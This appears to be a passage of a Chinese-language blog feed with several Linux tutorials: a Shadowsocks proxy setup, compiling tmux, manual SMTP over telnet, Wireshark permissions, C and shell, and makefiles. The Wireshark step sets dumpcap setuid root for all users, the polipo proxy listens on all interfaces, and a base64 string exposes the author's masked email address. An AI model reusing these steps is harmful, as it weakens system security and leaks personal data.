        <content type="html"><![CDATA[<h2 id="购买并配置VPS"><a href="#购买并配置VPS" class="headerlink" title="购买并配置VPS"></a>购买并配置VPS</h2><p>在<a href="http://banwagong.cn/">搬瓦工</a>选择一个<code>VPS</code>，大概每年<code>$19.99</code>，使用邀请码可优惠<code>6%</code>，可以使用支付宝(Alipay)购买。成功购买<code>VPS</code>后，进入<code>VPS</code>的<a href="https://kiwivm.64clouds.com/main.php">管理界面</a>，登录账户后便可以查看服务器信息，并进行相关配置了。</p><h2 id="安装SS服务器"><a href="#安装SS服务器" class="headerlink" title="安装SS服务器"></a>安装SS服务器</h2><p>如果VPS选用<code>centos</code>系统，则可以直接在配置界面左下方选择<code>Shadowsocks Server</code>，一键安装就<code>ok</code>了，当然喜欢折腾的也可以自己用<code>yum install</code>下载安装和配置<code>Shadowsocks</code>，此不赘述。</p><h2 id="安装SS客户端"><a href="#安装SS客户端" class="headerlink" title="安装SS客户端"></a>安装SS客户端</h2><h3 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h3><p><code>Ubuntu</code>可以选择<code>github</code>中的<a href="https://github.com/shadowsocks/shadowsocks">shadowsocks/shadowsocks</a>，或<a href="https://github.com/shadowsocks/shadowsocks-qt5">shadowsocks/shadowsocks-qt5</a>.</p><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p><code>Windows</code>选择<a href="https://github.com/shadowsocks/shadowsocks-windows">shadowsocks/shadowsocks-windows</a>，或<code>shadowsocks/shadowsocks-qt5</code>中的<a href="https://github.com/shadowsocks/shadowsocks-qt5/releases">ss-qt5-v2.9.0-win64.7z</a>。本人刚开始使用前者，无法科学上网，从<code>log</code>信息中发现可以将数据发送至<code>VPS</code>，但<code>VPS</code>无法解析其头部信息，故而连接失败，后来尝试网上各种方法无果，最终使用<code>qt5</code>版本成功。具体原因不详。</p><h3 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h3><p>安卓端就下载安装<a href="https://github.com/shadowsocks/shadowsocks-android/releases">shadowsocks/shadowsocks-android</a>内的<code>apk</code>即可。</p><h2 id="配置SS客户端"><a href="#配置SS客户端" class="headerlink" title="配置SS客户端"></a>配置SS客户端</h2><p><code>SS</code>的配置相当简单，参考<code>VPS</code>中<code>Shadowsocks</code>配置界面给的信息即可，必要信息包括：</p><ul><li>服务器地址 (<code>Host IP</code>)</li><li>密码(<code>password</code>)  </li><li>端口号<code>Port(default:443)</code></li><li>加密方式<code>encryption(default:aes-256-cfb)</code></li></ul><h2 id="配置浏览器"><a href="#配置浏览器" class="headerlink" title="配置浏览器"></a>配置浏览器</h2><p>无论是<code>google chrome</code>还是<code>firefox</code>，都有相应的代理插件，最常用的是<code>SwitchyOmega</code>。下载该插件并安装后，需要打开插件的<strong>选项</strong>，进行一定的配置操作：</p><ol><li>新建<strong>情景模式</strong>（<code>profile</code>），命名随意，如：<strong>SS</strong>;</li><li>在默认(<code>default</code>)选项中选择<code>SOCK5</code>，服务器(<code>Server</code>)设为<code>127.0.0.1</code>，端口(<code>port</code>)设为<code>1080</code>;</li><li>点击左侧的应用修改(<code>Apply changes</code>);</li><li>点击<code>auto switch</code>，页面上的条件栏(<code>condition</code>)不用管，点击下面的添加规则，在情景模式（<code>profile</code>）一列中选择之前创建的<code>SS</code>，默认选项分两种情况：<ul><li>普通网络，没有额外代理的情况，默认设为直连(<code>direct</code>);</li><li>如果是公司网设了代理，则默认设为代理<code>proxy</code>，并在代理<code>proxy</code>中设置好公司的代理服务器<code>IP</code>和端口号<code>port</code>.</li></ul></li><li>在下面的规则列表配置中，选择<code>AutoProxy</code>,添加网址<a href="https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt">https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt</a>， 然后点击下方按钮更新列表信息，网址无误的话会提示成功更新规则列表；</li><li>点击左侧应用修改<code>Apply changes</code>，在插件中选择<code>auto switch</code>选项即可开启自动切换代理模式。</li></ol><p>经过以上配置后，启动已配置好服务器信息的<code>Shadowsocks</code>客户端，正常情况下就可以访问<code>Google</code>, <code>youtube</code>等国外网站了。</p><h2 id="配置全局代理"><a href="#配置全局代理" class="headerlink" title="配置全局代理"></a>配置全局代理</h2><h3 id="系统配置"><a href="#系统配置" class="headerlink" title="系统配置"></a>系统配置</h3><p>在<code>Ubuntu</code>中，可以打开 Settings-&gt;Network-&gt;Network Proxy ，在<code>Socks Host</code>一栏中设置<code>IP</code>为<code>127.0.0.1</code>，代理端口为<code>1080</code>。这样便设置好了全局代理。<code>firefox</code>的网络设置选项中有单独一项用于选择系统代理设置，对应的就是这个。</p><h3 id="安装polipo"><a href="#安装polipo" class="headerlink" title="安装polipo"></a>安装polipo</h3><p><code>polipo</code>是一个小型的代理服务器软件，用于二次转发数据包，使用它可以配合系统设置里的全局代理实现真正的全局代理，让终端等应用都可以翻越<code>GFW</code>，这样在<code>shell</code>中下载软件就方便快速多了，亲测效果很是明显。</p><p>下面是安装配置步骤：</p><pre><code class="bash">$ sudo apt-get install polipo$ sudo vim /etc/polipo/config# This file only needs to list configuration variables that deviate# from the default values.  See /usr/share/doc/polipo/examples/config.sample# and &quot;polipo -v&quot; for variables you can tweak and further information.logSyslog = truelogFile = /var/log/polipo/polipo.logproxyAddress = &quot;0.0.0.0&quot;socksParentProxy = &quot;127.0.0.1:1080&quot;socksProxyType = socks5chunkHighMark = 50331648objectHighMark = 16384serverMaxSlots = 64serverSlots = 16serverSlots1 = 32</code></pre><p>修改<code>config</code>文件后需要重启一下<code>polipo</code>，然后测试是否代理是否成功开启。</p><pre><code class="bash">$ sudo /etc/init.d/polipo restart$ export http_proxy=&quot;http://127.0.0.1:8123/&quot; curl ifconfig.me***.***.***.*** # return your VPS-IP_ADDR if success</code></pre><p>到此就可以愉快的使用谷歌了，但是目前晚上的网速略慢，看<code>youtube</code>经常只能到<code>360P</code>。</p>]]></content>
      
      
      <categories>
          
          <category> Network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>远程服务器中编译安装tmux</title>
      <link href="2017/08/23/tmux-install/"/>
      <url>2017/08/23/tmux-install/</url>
      
        <content type="html"><![CDATA[<p>在工作当中，公司出于安全考虑，部署的远程Linux服务器总有一些限制（没网，Shell指令有限），而且员工作为普通用户，无法安装软件到除用户目录以外的目录。当我们需要下载安装一些常用工具时，因为没网，所以无法使用<code>apt-get</code>等下载指令，只能先在本地PC下载软件源码，然后传入服务器进行编译安装。本文以<code>tmux</code>为例说明服务器中编译安装软件的流程。</p><p>安装路径：<code>~/lib/software/tmux</code></p><h2 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h2><p><code>tmux</code>的下载地址 : <a href="https://github.com/tmux/tmux/releases/download/2.5/tmux-2.5.tar.gz">https://github.com/tmux/tmux/releases/download/2.5/tmux-2.5.tar.gz</a></p><p>依赖库<code>libevent</code>：<a href="https://github.com/libevent/libevent/releases/download/release-2.1.8-stable/libevent-2.1.8-stable.tar.gz">https://github.com/libevent/libevent/releases/download/release-2.1.8-stable/libevent-2.1.8-stable.tar.gz</a></p><p>下载后的文件通过一定方式(scp，共享服务，...)可以传入服务器中。</p><h2 id="Move-files-optional"><a href="#Move-files-optional" class="headerlink" title="Move files (optional)"></a>Move files (optional)</h2><p>在服务器中执行以下指令，将文件放入<code>~/lib</code>文件夹。</p><pre><code class="bash">cdmkdir libcp sharedir.git/*.tar.gz lib/</code></pre><h2 id="Edit-profile"><a href="#Edit-profile" class="headerlink" title="Edit .profile"></a>Edit .profile</h2><p>编辑<code>.profile</code>，添加全局变量<code>SWDIR</code>（存放用户手动编译安装的软件）；更新依赖库<code>LD_LIBRARY_PATH</code>和环境变量<code>PATH</code>，分别添加<code>tmux</code>的依赖路径和安装路径。</p><pre><code class="bash">$ vim ~/.profile# ...export SWDIR=/home/&lt;username&gt;/lib/softwareexport LD_LIBRARY_PATH=$LD_LIBRARY:$SWDIR/libevent/libPATH=$PATH:$&#123;SWDIR&#125;/tmux/:$&#123;SWDIR&#125;/tmux/bin/</code></pre><h2 id="Complie-libevent"><a href="#Complie-libevent" class="headerlink" title="Complie libevent"></a>Complie libevent</h2><p>配置好环境变量后，首先编译<code>tmux</code>的依赖库<code>libevent</code></p><pre><code class="bash">cd ~/libtar -xvzf libevent-2.1.8-stable.tar.gzcd libevent-2.1.8-stable./autogen.sh./configure --prefix=$SWDIR/libevent &amp;&amp; makemake install</code></pre><p><strong>说明：</strong>默认安装路径是没有访问权限的，所以需要使用<code>--prefix</code>选项手动指定安装路径至用户目录中的某个文件夹。</p><h2 id="Complie-tmux"><a href="#Complie-tmux" class="headerlink" title="Complie tmux"></a>Complie tmux</h2><pre><code class="bash">cd ~/libtar -xvzf tmux-2.5.tar.gzcd tmux-2.5./configure --prefix=$SWDIR/tmux CFLAGS=&quot;-I$SWDIR/libevent/include&quot; LDFLAGS=&quot;-L$SWDIR/libevent/lib&quot; &amp;&amp; makemake install</code></pre><p><strong>说明：</strong><code>CFLAGS</code>和<code>LDFLAGS</code>用于指定编译<code>tmux</code>所需的依赖库文件。</p><p>至此，<code>tmux</code>便安装完成了。在<code>shell</code>中输入<code>tmux</code>即可启动，通过<code>man tmux</code>可以查看帮助文档。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> tmux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Telnet中使用smtp发送邮件</title>
      <link href="2017/08/17/telnet-smtp/"/>
      <url>2017/08/17/telnet-smtp/</url>
      
        <content type="html"><![CDATA[<p><code>Telnet</code>是远程登录服务的标准协议和主要方式，工作于<code>TCP/IP</code>协议族的应用层，常用于远程登录<code>web</code>服务器，其中便包括<code>SMTP</code>，<code>POP3</code>等邮件服务器。</p><p>这几天参考书籍《计算机网络-自顶向下方法》学习计算机网络知识，顺便尝试了如何使用<code>Telnet</code>登录<code>smtp</code>发送邮件，下面通过一个简单示例介绍具体的发送过程。</p><h2 id="Telnet-smtp-163-com-25"><a href="#Telnet-smtp-163-com-25" class="headerlink" title="Telnet smtp.163.com 25"></a>Telnet smtp.163.com 25</h2><p><code>smtp</code>对应的端口号为<code>25</code>，以163邮箱为例，下面是邮件发送过程。</p><pre><code class="zsh">→ ~ telnet smtp.163.com 25Trying 220.181.12.15...Connected to smtp.163.com.Escape character is ^].220 163.com Anti-spam GT for Coremail System (163com[20141201])helo 163.com250 OKauth login334 dXNlcm5hbWU6MTgyNjY2MzI4NzJAMTYzLmNvbQ==334 UGFzc3dvcmQ6****************235 Authentication successfulmail from:&lt;182****2872@163.com&gt;250 Mail OKrcpt to:&lt;707***098@qq.com&gt;250 Mail OKdata354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;From: 182****2872@163.comTo: 707***098@qq.comSubject: Test the use of smtp  Hello, litreily.  This is a message edit with telnet.Best wish to you.Litreily.250 Mail OK queued as smtp11,D8CowAAnjlqKlZVZXa4QAQ--.18342S2 1502975693quitConnection closed by foreign host.→ ~</code></pre><p>下面分开对每个过程进行解析，<code>C</code>代表客户端，即本机，<code>S</code>代表远程服务器端。整个过程分为以下几步：</p><ul><li>打招呼</li><li>账户认证</li><li>声明邮箱地址</li><li>书写邮件内容</li><li>退出<code>Telnet</code></li></ul><h3 id="招呼语"><a href="#招呼语" class="headerlink" title="招呼语"></a>招呼语</h3><pre><code class="bash">S 220 163.com Anti-spam GT for Coremail System (163com[20141201])C helo 163.comS 250 OK</code></pre><p><code>220</code>代表服务器已准备好，客户端首先向服务器打一声招呼<code>helo</code>，服务器接收到后返回一个<code>250</code>应答信号，代表打招呼成功，下面可以进行账户的密码认证。</p><h3 id="账户认证"><a href="#账户认证" class="headerlink" title="账户认证"></a>账户认证</h3><pre><code class="bash">C auth loginS 334 dXNlcm5hbWU6C MTgyNjY2MzI4NzJAMTYzLmNvbQ==S 334 UGFzc3dvcmQ6C ****************S 235 Authentication successful</code></pre><p>客户端发送<code>auth login</code>声明自己将进行邮箱账户的用户名认证和密码认证。服务器端返回一个以<code>334</code>代码开头的提示信息，不必追究其语义，而后用户依次输入通过<code>Base64</code>加密的邮箱名和密码，加密网址见后续参考资料。当输入的账号密码无误时，服务端将返回认证成功的提示语。</p><h3 id="声明邮箱地址"><a href="#声明邮箱地址" class="headerlink" title="声明邮箱地址"></a>声明邮箱地址</h3><pre><code class="bash">C mail from:&lt;182****2872@163.com&gt;S 250 Mail OKC rcpt to:&lt;707***098@qq.com&gt;S 250 Mail OK</code></pre><p>账户密码认证结束后，客户端通过<code>mail from:&lt;emailName&gt;</code>以及<code>rcpt to:&lt;nameEmail&gt;</code>声明邮箱的源地址和目的地址。</p><h3 id="书写邮件内容"><a href="#书写邮件内容" class="headerlink" title="书写邮件内容"></a>书写邮件内容</h3><pre><code class="bash">C dataS 354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;C From: 182****2872@163.comC To: 707***098@qq.comC Subject: Test the use of smtpCC   Hello, litreily.C   This is a message edit with telnet.CC Best wish to you.C LitreilyC .S 250 Mail OK queued as smtp11,D8CowAAnjlqKlZVZXa4QAQ--.18342S2 1502975693</code></pre><p>写明邮件地址后，使用指令<code>data</code>进入邮件编辑状态，服务器端会提示当输入<code>&lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;</code>时退出编辑状态。</p><p>邮件内容有一定的格式要求，不按要求随意书写有可能被当成垃圾邮件或不合法邮件而退信。通常需要指定邮件主题<code>Subject</code>，其它相关信息包括时间<code>Date</code>，邮件地址<code>From</code>，<code>To</code>等，然后再书写邮件主体内容，更详细的格式可以参考文档<strong>【RFC 821】</strong>。编辑结束后，以单行的点号<code>.</code>结束。如果一切正常，服务器端将返回以<code>250</code>开头的应答信息，并提示邮件以进入<code>smtp</code>的发送队列。此时便可以查收邮件予以验证了。</p><h3 id="退出Telnet"><a href="#退出Telnet" class="headerlink" title="退出Telnet"></a>退出Telnet</h3><pre><code class="bash">C quitS Connection closed by foreign host.</code></pre><p>当邮件发送结束后，客户端通过<code>quit</code>退出<code>Telnet</code>。</p><h2 id="SMTP-Code"><a href="#SMTP-Code" class="headerlink" title="SMTP Code"></a>SMTP Code</h2><ul><li><code>211</code> 系统状态或系统帮助响应</li><li><code>214</code> 帮助信息</li><li><code>220</code> 服务就绪</li><li><code>221</code> 服务关闭传输信道</li><li><code>235</code> 用户验证成功</li><li><code>250</code> 要求的邮件操作完成</li><li><code>251</code> 用户非本地，将转发向</li><li><code>334</code> 等待用户输入验证信息</li><li><code>354</code> 开始邮件输入，以单行**.**结束</li><li><code>421</code> 服务未就绪，关闭传输信道（当必须关闭时，此应答可以作为对任何命令的响应）</li><li><code>450</code> 要求的邮件操作未完成，邮箱不可用（例如，邮箱忙）</li><li><code>451</code> 放弃要求的操作；处理过程中出错</li><li><code>452</code> 系统存储不足，要求的操作未执行</li><li><code>500</code> 格式错误，命令不可识别（此错误也包括命令行过长）</li><li><code>501</code> 参数格式错误</li><li><code>502</code> 命令不可实现</li><li><code>503</code> 错误的命令序列</li><li><code>504</code> 命令参数不可实现</li><li><code>535</code> 用户验证失败</li><li><code>550</code> 要求的邮件操作未完成，邮箱不可用（例如，邮箱未找到，或不可访问）</li><li><code>551</code> 用户非本地，请尝试</li><li><code>552</code> 过量的存储分配，要求的操作未执行</li><li><code>553</code> 邮箱名不可用，要求的操作未执行（例如邮箱格式错误）</li><li><code>554</code> 操作失败</li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><code>SMTP</code>文档(<code>RFC 821</code>) : <a href="https://tools.ietf.org/pdf/rfc821.pdf">https://tools.ietf.org/pdf/rfc821.pdf</a></li><li><code>SMTP Code</code> : <a href="http://bbs.csdn.net/topics/80275246">http://bbs.csdn.net/topics/80275246</a></li><li><code>163.com</code> 邮件退信代码 : <a href="http://help.163.com/09/1224/17/5RAJ4LMH00753VB8.html">http://help.163.com/09/1224/17/5RAJ4LMH00753VB8.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> telnet </tag>
            
            <tag> smtp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu下解决wireshark没有权限的问题</title>
      <link href="2017/07/28/chmod-wireshark/"/>
      <url>2017/07/28/chmod-wireshark/</url>
      
        <content type="html"><![CDATA[<p><code>wireshark</code>是常用的网络抓包工具，在<code>ubuntu</code>中安装方法如下：</p><pre><code class="bash">sudo aptitude install wireshark</code></pre><p>安装以后，打开软件后，在选择网络接口进行抓包时会提示没有权限，为此，可以通过以下方法解决。</p><pre><code class="bash"># 添加用户组，命名为wiresharksudo groupadd wireshark  # 将dumpcap更改为刚添加的用户组sudo chgrp wireshark /usr/bin/dumpcap  # 为wireshark用户组添加使用dumpcap的root权限sudo chmod 4755 /usr/bin/dumpcap# 将自己的用户(本人litreily)添加到wireshark用户组sudo gpasswd -a litreily wireshark  </code></pre><p>执行完成以后便可以使用<code>wireshark</code>正常抓包了。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> wireshark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C程序与Shell脚本混合编程</title>
      <link href="2017/07/27/mixwith-shell/"/>
      <url>2017/07/27/mixwith-shell/</url>
      
        <content type="html"><![CDATA[<p>对于嵌入式软件开发，有时候需要在使用<code>C</code>语言进行开发的同时，嵌入<code>shell</code>脚本指令，以完成一些特定的任务。</p><p>本文结合上一篇博文“初探makefile”的程序代码，加上一个简单的<code>shell</code>脚本，说明两者混合编程的方法。</p><h2 id="编写-shell-脚本"><a href="#编写-shell-脚本" class="headerlink" title="编写 shell 脚本"></a>编写 shell 脚本</h2><pre><code class="bash">vim shell.sh</code></pre><p>使用<code>vim</code>编辑器新建<code>shell.sh</code>脚本文件。</p><pre><code class="bash">#!/bin/zshecho &quot;Hello world!&quot;echo &quot;Please input your strings&quot;read input_stringecho &quot;input_string=$input_string&quot;</code></pre><p>脚本首先输出一个“Hello world!”，然后输出一个字符串输入提示语，等待用户输入后，打印出相应的信息。</p><h2 id="在-main-c-中调用-shell-脚本"><a href="#在-main-c-中调用-shell-脚本" class="headerlink" title="在 main.c 中调用 shell 脚本"></a>在 main.c 中调用 shell 脚本</h2><p>为了在<code>C</code>文件中调用<code>shell</code>脚本，可以使用<code>stdlib.h</code>库中的<code>system</code>函数，调用方式如下：</p><pre><code class="c">#include &lt;stdlib.h&gt;...void func(void)&#123;    system(&quot;bash ./&lt;script-filename&gt;.sh&quot;);    // bash为默认shell，也可改用诸如&quot;zsh&quot;类的shell&#125;</code></pre><p>根据该用法修改原有的<code>main.c</code></p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &quot;main.h&quot;#include &quot;add.h&quot;int main(void)&#123;    int a = 10;    int b = 1;    int c = add(a,b);    printf(&quot;%d + %d = %d\n&quot;,a,b,c);    system(&quot;zsh ./shell.sh&quot;);     // 调用 shell 脚本    printf(&quot;Infos:File-%s, Func-%s, Line-%d\n&quot;,__FILE__,__func__,__LINE__);    /*    __FILE__ : 文件名    __func__ : 函数名    __LINE__ : 所在行    */    return 0;&#125;</code></pre><h2 id="编译链接并执行"><a href="#编译链接并执行" class="headerlink" title="编译链接并执行"></a>编译链接并执行</h2><pre><code class="bash">$ make clean                # 清除目标文件rm test main.o add.o$ make                      # 生成可执行文件cc    -c -o main.o main.ccc    -c -o add.o add.ccc -o test main.o add.o$ ./test                    # 执行可执行文件10 + 1 = 11                 # 加法运算结果Hello world!                # shell 脚本欢迎语Please input your strings   # 提示语whatever                    # 手动输入的信息  input_string=whatever       # 显示信息Infos:File-main.c, Func-main, Line-14   # 显示打印程序所在文件、函数及对应行数</code></pre><p><strong>说明</strong>：当使用<code>printf</code>函数时，如果不在输出信息后添加<code>\n</code>换行符的话，其输出信息有可能与<code>shell</code>脚本执行结果发生错位。为避免该情况的发生，应习惯在<code>printf</code>函数调用过程中加入换行符。</p><h2 id="显示脚本指令"><a href="#显示脚本指令" class="headerlink" title="显示脚本指令"></a>显示脚本指令</h2><p>为了追踪每个脚本指令的执行过程，可以修改<code>system</code>函数调用方式，在<code>bash</code>,<code>zsh</code>后添加选项<code>-x</code>.</p><pre><code class="c">system(&quot;zsh -x ./shell.sh&quot;);</code></pre><p>修改后重新执行make，执行<code>./test</code>得到以下结果</p><pre><code class="zsh">$ ./test10 + 1 = 11+/etc/zsh/zshenv:15&gt; [[ -z /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin || /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin == /bin:/usr/bin ]]+./shell.sh:3&gt; echo &#39;Hello world!&#39;Hello world!+./shell.sh:4&gt; echo &#39;Please input your strings&#39;Please input your strings+./shell.sh:5&gt; read input_stringwhat+./shell.sh:6&gt; echo &#39;input_string=what&#39;input_string=whatInfos:File-main.c, Func-main, Line-14</code></pre><p>使用不同的<code>shell</code>，其显示效果不大一致，下面是使用<code>bash</code>执行后的效果。</p><pre><code class="bash">$ ./test10 + 1 = 11+ echo &#39;Hello world!&#39;Hello world!+ echo &#39;Please input your strings&#39;Please input your strings+ read input_stringwhat+ echo input_string=whatinput_string=whatInfos:File-main.c, Func-main, Line-14</code></pre><p><strong>说明</strong>：上述执行过程中显示的空行是为了清楚显示执行过程手动添加的，实际执行过程中并无空行。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> ubuntu </tag>
            
            <tag> makefile </tag>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初探makefile</title>
      <link href="2017/07/25/makefile/"/>
      <url>2017/07/25/makefile/</url>
      
        <content type="html"><![CDATA[<p>嵌入式软件开发少不了使用makefile进行软件编译，写好一个makefile，让其完成所有程序代码的自动化编译链接，可以提高软件开发效率。<code>make</code>是一个命令工具，用于解释并执行makefile中的指令。大多数IDE都有这个命令工具，如<code>Visual C++</code>的<code>nmake</code>，<code>Linux</code>中<code>GNU</code>的<code>make</code>。本文以一个简单例子说明<code>makefile</code>文件的书写规范和执行过程。</p><h2 id="创建待编译的文件"><a href="#创建待编译的文件" class="headerlink" title="创建待编译的文件"></a>创建待编译的文件</h2><pre><code class="bash">mkdir mkfilesvim add.h add.c main.h main.c</code></pre><p>然后逐个编辑头文件和源文件，实现一个简单的加法运算。</p><h3 id="add-h"><a href="#add-h" class="headerlink" title="add.h"></a>add.h</h3><p>加法函数放于<code>add.c</code>中，对应头文件为<code>add.h</code>，用于存放函数声明。</p><pre><code class="c">#ifndef __ADD_H_#define __ADD_H_// declaration functionsint add(int a,int b);#endif // __ADD_H_</code></pre><h3 id="add-c"><a href="#add-c" class="headerlink" title="add.c"></a>add.c</h3><p>在<code>add.c</code>中实现加法函数。</p><pre><code class="c">#include &quot;add.h&quot;int add(int a, int b)&#123;  return a+b;&#125;</code></pre><h3 id="main-h"><a href="#main-h" class="headerlink" title="main.h"></a>main.h</h3><p>在主函数对应的头文件<code>main.h</code>中添加依赖的头文件。</p><pre><code class="c">#ifndef __MAIN_H_#define __MAIN_H_#include &lt;math.h&gt;#endif // __MAIN_H_</code></pre><h3 id="main-c"><a href="#main-c" class="headerlink" title="main.c"></a>main.c</h3><p>在<code>main.c</code>中实现主函数，打印出一个加法运算结果。</p><pre><code class="c">#include &lt;stdio.h&gt;#include &quot;main.h&quot;#include &quot;add.h&quot;int main(void)&#123;  int a = 10;  int b = 1;  int c = add(a,b);  printf(&quot;%d + %d = %d\n&quot;,a,b,c);  return 0;&#125;</code></pre><h2 id="创建-makefile"><a href="#创建-makefile" class="headerlink" title="创建 makefile"></a>创建 makefile</h2><h3 id="makefile-规则"><a href="#makefile-规则" class="headerlink" title="makefile 规则"></a>makefile 规则</h3><pre><code class="bash">target ... : prerequisites ...&lt;tab&gt;   command......</code></pre><p><code>target</code>: 目标文件，可以是.o（object file）文件，也可以是最终的可执行文件<br><code>prerequisites</code> : 生成目标文件所需的文件或是目标（<code>*.h</code>, <code>*.c</code>, <code>*.o</code>, ...）<br><code>command</code>: <code>make</code>需要执行的编译、链接等指令（所有指令前都以<code>TAB</code>键开头）</p><h3 id="makefile-基础写法"><a href="#makefile-基础写法" class="headerlink" title="makefile 基础写法"></a>makefile 基础写法</h3><pre><code class="makefile">test : main.o add.occ -o test main.o add.omain.o : main.c main.h add.hcc -c main.cadd.o : add.c add.hcc -c add.c# make clean : use to clean all the object files.PHONY : cleanclean :rm test main.o add.o</code></pre><p>其中，test, main.o, add.o均是目标文件<code>target</code>；所有源文件及头文件均为<code>prerequisites</code>；</p><p><code>cc</code> : 编译器，与<code>gcc</code>相似，<code>-c</code>代表编译，执行后产生对象文件，即&quot;.o&quot;文件；<code>-o</code>代表链接，用于链接&quot;.o&quot;文件并生成可执行文件；</p><p><code>.PHONY</code> : 用于声明后面跟着的都是伪目标（类似于C语言中的标签(Label)）；</p><p><code>clean</code> ： 一个伪目标，只有在外部执行<code>make clean</code>时方才执行相应的执行，此次用于删除生成的所有目标文件。</p><h3 id="makefile-简化版1"><a href="#makefile-简化版1" class="headerlink" title="makefile 简化版1"></a>makefile 简化版1</h3><p>在<code>makefile</code>中可以通过<code>$</code>符号引用变量，简化文件。变量定义以等号连接，类似于宏定义，将需要多处使用的字符串存入变量中可以方便修改和管理，如本例，可定义以下变量：</p><pre><code class="makefile">objs = main.o add.o  # 引用方法 $(objs)</code></pre><p>简化后的<code>makefile</code>如下：</p><pre><code class="makefile">objs = main.o add.otest : $(objs)cc -o test $(objs)main.o : main.c main.h add.hcc -c main.cadd.o : add.c add.hcc -c add.c# make clean : use to clean all the object files.PHONY : cleanclean :rm test (objs)</code></pre><p>当项目文件很多时，合理使用变量可以大大简化<code>makefile</code>的编写和修改。</p><h3 id="makefile-简化版2"><a href="#makefile-简化版2" class="headerlink" title="makefile 简化版2"></a>makefile 简化版2</h3><p>要知道，<code>make</code>非常强大，具有<strong>自动推导</strong>的功能，可以自动推导&quot;.o&quot;目标文件下面的指令。如果目标文件为&quot;main.o&quot;，那么指令必然为&quot;cc -c main.c&quot;，依赖于<code>make</code>指令的推导功能，<code>makefile</code>可以省略该指令的编写。</p><p>此外，每个&quot;.o&quot;目标文件的依赖文件必然包含一个文件名相同的&quot;.c&quot;文件，该文件可以通过自动推导得出，所以在<code>makefile</code>中同样可以省略。</p><p>根据以上规则可以对<code>makefile</code>进一步简化：</p><pre><code class="makefile">objs = main.o add.otest : $(objs)cc -o test $(objs)main.o : main.h add.hadd.o : add.h# make clean : use to clean all the object files.PHONY : cleanclean :rm test (objs)</code></pre><h2 id="make"><a href="#make" class="headerlink" title="make"></a>make</h2><p>编写好<code>makefile</code>文件后，便可以使用<code>make</code>指令进行编译链接并生成可执行文件了。</p><pre><code class="bash">$ make  # 生成可执行文件cc -c main.ccc -c add.ccc -o test main.o add.o$ lsadd.c  add.h  add.o  main.c  main.h  main.o  makefile  test$ ./test  # 执行可执行文件10 + 1 = 11$ make clean  # 清除所有目标文件rm test main.o add.o$ lsadd.c  add.h  main.c  main.h  makefile</code></pre><p>至此，一个简单的<code>makefile</code>编写过程及执行过程便结束了。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> ubuntu </tag>
            
            <tag> makefile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安装Ubuntu后的系统精简与美化</title>
      <link href="2017/06/11/initial-ubuntu/"/>
      <url>2017/06/11/initial-ubuntu/</url>
      
        <content type="html"><![CDATA[<p>安装好Ubuntu系统后，通常需要卸载许多用不上的软件，并安装一些常用以及实用的软件。当然，Ubuntu默认的主题实在不敢恭维，为此有必要换一套主题予以美化。</p><h2 id="系统精简"><a href="#系统精简" class="headerlink" title="系统精简"></a>系统精简</h2><p>删除不必要的软件</p><h3 id="删除libreoffice"><a href="#删除libreoffice" class="headerlink" title="删除libreoffice"></a>删除libreoffice</h3><pre><code class="bash">sudo apt-get remove libreoffice-common</code></pre><h3 id="删除Amazon链接"><a href="#删除Amazon链接" class="headerlink" title="删除Amazon链接"></a>删除Amazon链接</h3><pre><code class="bash">sudo apt-get remove unity-webapps-common</code></pre><h3 id="删除其它极少用的软件"><a href="#删除其它极少用的软件" class="headerlink" title="删除其它极少用的软件"></a>删除其它极少用的软件</h3><pre><code class="bash">sudo apt-get remove thunderbird totem rhythmbox empathy brasero simple-scan gnome-mahjongg aisleriot gnome-mines cheese transmission-common gnome-orca webbrowser-app gnome-sudokusudo apt-get remove onboard deja-dup</code></pre><h2 id="常用软件安装"><a href="#常用软件安装" class="headerlink" title="常用软件安装"></a>常用软件安装</h2><h3 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h3><pre><code class="bash">sudo apt-get install vim    # Vimsudo apt-get install git    # Git</code></pre><p>安装<code>Git</code>之后需要配置以下全局变量，并生成<code>ssh-key</code></p><pre><code class="bash">git config --global user.email &quot;emailname@email.com&quot;git config --global user.name &quot;username&quot;ssh-keygen -t rsa -C &quot;emailname@email.com&quot;cd ~/.sshgedit id_rsa.pub    # 将文件内容添加至github或其它代码托管平台</code></pre><h3 id="系统指示器Syspeek"><a 